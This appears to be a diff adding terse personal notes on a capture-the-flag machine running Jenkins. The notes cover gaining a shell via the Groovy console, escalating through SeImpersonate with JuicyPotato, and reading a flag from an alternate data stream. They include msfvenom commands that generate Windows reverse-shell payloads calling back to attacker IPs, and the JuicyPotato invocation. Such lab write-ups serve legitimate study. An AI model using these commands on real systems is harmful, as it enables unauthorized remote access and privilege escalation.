@@ -1,0 +1,27 @@
+jenekns website
+
+on main port 80 have a error on other 50000 port it have a path ==askjeevs==
+
+we added groovy shell on console script and got shell
+
+we found priv as SeImpersonate so we downloaded JuicyPotato.exe on it and a bat file or exe file
+
+then
+
+==JuicyPotato.exe -t * -p shell.bat -l 4444==
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=80 -a x64 --platform Windows -f exe -o shell.exe
+```
+
+msfvenom -p cmd/windows/==reverse_powershell== lhost=10.10.14.7 lport=4242 > shell.bat
+
+we uploaded bat file as for exe it was saying malicious file.
+
+we got shell
+
+flag was ==hidden== to see
+
+==dir /R==
+
+more < hm.txt:root.txt
